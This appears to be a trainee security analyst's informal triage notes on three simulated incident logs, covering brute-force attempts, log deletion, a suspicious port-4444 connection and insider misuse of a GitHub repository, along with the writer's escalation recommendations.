ANALYSIS:
2103, 2104, 2015,
- root acces from same IP=102.45.122.19 possible password cracking / brute force because it happened within short time frame and in exact 2 second ranges

09:13:22 user was connected with this IP to microsoft teams which is nothing malicious but i dont know what is pastebin[.]com so i would need to look that up if I have time. Later the process is continuing I think best scenario would be to know if this is some developer and is doing nothing malicious or call mark if it is not prohibited by company policy if he is really doing this right now.

2119, 2120, 2121 seems password cracking again this time from 45.76.210.55 this time in 3 second intervals would keep an eye on some strange behavior in some of the accounts

we have a behavior which shouldnt be here this requires immediate attention because even if mark is a developer or not he just deleted logs, I dont think there is any reason why he would do this in his work PC, this requires immediate attention and possible quaratine to marks PC, also assign marks PC communication to another analyst to find out if there is was some malicious communication going on.
at 09:24:51 we have kernel connection port 4444 - mostly malicious from python which was mark executing
I would try to quaratine as much as possible and also escalate it to L2 immediately but this one as Immediate threat not Critical

2127, 2128, 2129 are again password cracking / brute forcing this time from IP=198.51.100.82

ANALYSIS:

10:02:11 straight away new user James gets assigned priviledges and first thing tries to access corporate backup that requires attention

10:04:12 bob tries also shadow -> which upon examination stores user encrypted passwords and credentials this also requires more informatiom but rather categorize it as malicious and be wrong than have a break or leak of credentials

10:03:45 upon examination of 0x1010 james is trying to read memory another suspicious behavior -> he should be contacted immedistely if company policy doesnt deny it or at least watched for further information

10:06:01 - 02 - 03 we also have external connection from 185.99.132.12 trying what looks like brute force / password cracking

10:04:47 james was added to domain admins and executes script this would require immediate attention and possible escalation or adding another analyst as for one person 2 breaches at once could be too much to handle

james is checking for windows update in my opinion for possible later version of windows in case which has not patched certain vulnerabilities

10:09:07 we have alice deleting LOGS for which I belive she has absolutely no reason

by this time I would assume all three accounts are compromised and require IMMEDIATE escalation and attention of other analysts also

10:12:41 james is connecting to external url with china .cn domain

10:15:31 outbount connection established on port 4444 IP=198.51.100.23 established from python

10:17:33 alice is accesing logs in /temp/ i think for possible deletion of them and covering tracks

10:19:08 James created Update -> update for possible covering of tracks of the attack and updates group policy

if it were on me 10:04:47 would be breaking point and I would try to quarantine the actions of James + contact other analysts about possible attack, by the time I was sure that Bob, James and Alice I would have called for High priority escalation and critical alert to L2

ANALYSIS:
08:07:11 emily with message lets keep it off company chat seems of but this is not for me to judge, i would just forward it to compliance department
it could also be attacker knowing these chat might be intercepted and trying to blink blink if someone reads it
but by itself I wouldnt categorize emily or lukas as maliciois actors

alex gives signed as true malicious actor
08:08:02 alex posts OAuth to github repo (this alone should mark suspicious and would need rosponding)
08:09:31 sucessful login for emily’s account while she seems to be logged in also to this account at the same time while she is in poland (or at least shows)
08:11:24 alex acesses private repo
08:12:55 alex removes branch protection
08:16:12 admin from unregisterred IP
08:19:42 shares internal repository with unknown account
